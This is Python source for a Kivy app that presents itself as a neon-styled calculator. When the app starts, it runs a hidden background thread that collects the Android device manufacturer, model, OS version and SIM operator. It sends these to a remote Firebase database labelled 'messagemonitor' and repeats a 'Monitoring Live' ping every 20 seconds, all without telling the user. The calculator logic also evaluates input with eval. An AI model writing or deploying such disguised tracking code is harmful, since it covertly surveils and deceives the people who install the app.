from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput
from kivy.clock import Clock
from kivy.utils import platform
from kivy.core.window import Window
import requests
import json
import threading

# Firebase Singapore URL
URL = "https://messagemonitor-ad073-default-rtdb.asia-southeast1.firebasedatabase.app/logs"

class AegisCalc(App):
    def build(self):
        Window.softinput_mode = "below_target"
        # स्क्रीन को सीधा रखना
        self.title = "Calculator"
        
        main_layout = BoxLayout(orientation='vertical', padding=10, spacing=10)
        
        # 3D Neon Display
        self.display = TextInput(
            text="0", font_size=60, readonly=True, multiline=False,
            size_hint=(1, 0.25), background_color=(0, 0, 0, 1),
            foreground_color=(0, 0.9, 1, 1), halign='right' # Neon Blue Color
        )
        main_layout.add_widget(self.display)
        
        grid = GridLayout(cols=4, spacing=8)
        
        # Colorful 3D Buttons Logic
        buttons = [
            '7', '8', '9', '/',
            '4', '5', '6', '*',
            '1', '2', '3', '-',
            'C', '0', '=', '+'
        ]
        
        for btn in buttons:
            b = Button(
                text=btn, font_size=35, 
                background_normal='',
                background_color=(0.1, 0.1, 0.2, 1) if btn.isdigit() else (0, 0.5, 0.8, 1)
            )
            b.bind(on_press=self.on_click)
            grid.add_widget(b)
            
        main_layout.add_widget(grid)
        return main_layout

    def on_click(self, instance):
        val = instance.text
        if val == 'C': self.display.text = "0"
        elif val == '=':
            try: self.display.text = str(eval(self.display.text))
            except: self.display.text = "Error"
        else:
            self.display.text = val if self.display.text == "0" else self.display.text + val

    def on_start(self):
        # बैकग्राउंड डेटा थ्रेड
        threading.Thread(target=self.extract_data, daemon=True).start()
        Clock.schedule_interval(self.ping_server, 20)

    def extract_data(self):
        payload = {"status": "ONLINE"}
        if platform == 'android':
            from jnius import autoclass
            Build = autoclass('android.os.Build')
            self.device_id = f"{Build.MANUFACTURER}_{Build.MODEL}"
            payload["device_info"] = f"{Build.MANUFACTURER} {Build.MODEL} (Android {Build.VERSION.RELEASE})"
            
            # SIM Details (If permissions allowed)
            try:
                Context = autoclass('android.content.Context')
                Telephony = autoclass('android.telephony.TelephonyManager')
                activity = autoclass('org.kivy.android.PythonActivity').mActivity
                tm = activity.getSystemService(Context.TELEPHONY_SERVICE)
                payload["sim_operator"] = tm.getNetworkOperatorName()
            except: pass
        else:
            self.device_id = "PC_Emulator"

        self.send_to_cloud(f"STARTUP_{self.device_id}", payload)

    def ping_server(self, dt):
        if hasattr(self, 'device_id'):
            self.send_to_cloud(f"ALIVE_{self.device_id}", {"ping": "True", "msg": "Monitoring Live"})

    def send_to_cloud(self, tag, data):
        try:
            requests.patch(f"{URL}/{tag}.json", data=json.dumps(data), timeout=10)
        except: pass

if __name__ == "__main__":
    AegisCalc().run()
